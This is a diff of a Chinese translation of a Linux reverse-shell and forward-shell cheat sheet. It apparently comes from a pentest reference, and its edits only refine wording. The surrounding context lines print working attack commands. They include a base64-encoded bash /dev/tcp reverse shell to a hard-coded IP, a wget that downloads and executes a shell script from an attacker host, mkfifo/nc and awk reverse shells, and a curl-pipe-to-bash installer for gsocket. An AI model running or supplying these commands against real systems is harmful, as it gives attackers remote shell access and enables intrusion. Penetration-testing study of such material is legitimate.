@@ -35,10 +35,10 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 #### Shell 解释
 
 1. **`bash -i`**: 该命令的这一部分启动一个交互式（`-i`）Bash shell。
-2. **`>&`**: 该命令的这一部分是一个简写符号，用于**将标准输出**（`stdout`）和**标准错误**（`stderr`）**重定向到同一目标**。
+2. **`>&`**: 该命令的这一部分是一个简写符号，用于**将标准输出**（`stdout`）和**标准错误**（`stderr`）**重定向到同一目的地**。
 3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: 这是一个特殊文件，**表示与指定IP地址和端口的TCP连接**。
 - 通过**将输出和错误流重定向到此文件**，该命令有效地将交互式shell会话的输出发送到攻击者的机器。
-4. **`0>&1`**: 该命令的这一部分**将标准输入（`stdin`）重定向到与标准输出（`stdout`）相同的目标**。
+4. **`0>&1`**: 该命令的这一部分**将标准输入（`stdin`）重定向到与标准输出（`stdout`）相同的目的地**。
 
 ### 创建文件并执行
 ```bash
@@ -47,11 +47,11 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Forward Shell
 
-在处理基于Linux的Web应用程序中的**远程代码执行（RCE）**漏洞时，实现反向shell可能会受到网络防御措施的阻碍，例如iptables规则或复杂的数据包过滤机制。在这种受限环境中，另一种方法是建立一个PTY（伪终端）shell，以更有效地与被攻陷的系统进行交互。
+当处理基于 Linux 的 web 应用程序中的 **Remote Code Execution (RCE)** 漏洞时，实现反向 shell 可能会受到网络防御措施的阻碍，例如 iptables 规则或复杂的包过滤机制。在这种受限环境中，另一种方法是建立一个 PTY（伪终端）shell，以更有效地与被攻陷的系统进行交互。
 
-为此推荐的工具是[toboggan](https://github.com/n3rada/toboggan.git)，它简化了与目标环境的交互。
+推荐的工具是 [toboggan](https://github.com/n3rada/toboggan.git)，它简化了与目标环境的交互。
 
-要有效使用toboggan，请创建一个针对目标系统RCE上下文量身定制的Python模块。例如，一个名为`nix.py`的模块可以结构如下：
+要有效使用 toboggan，请创建一个针对目标系统 RCE 上下文量身定制的 Python 模块。例如，一个名为 `nix.py` 的模块可以结构如下：
 ```python3
 import jwt
 import httpx
@@ -101,7 +101,7 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <
 ```
 ## gsocket
 
-在 [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/) 中查看它
+在 [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/) 中查看
 ```bash
 bash -c "$(curl -fsSL gsocket.io/x)"
 ```
@@ -239,7 +239,7 @@ curl -L https://github.com/robiot/rustcat/releases/latest/download/rustcat-x86_6
 特性：
 - 可选的 `--ssl` 标志用于加密传输（TLS 1.3）
 - `-s` 用于在受害者上生成任何二进制文件（例如 `/bin/sh`、`python3`）
-- `--up` 自动升级为完全交互式 PTY
+- `--up` 自动升级为完全交互的 PTY
 
 ## revsh（加密和可用于跳板）
 
@@ -301,7 +301,7 @@ awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s;
 ```bash
 while true; do nc -l 79; done
 ```
-要发送命令，请写下它，按回车，然后按CTRL+D（停止STDIN）
+要发送命令，请写下它，按回车，然后按CTRL+D（以停止STDIN）
 
 **受害者**
 ```bash
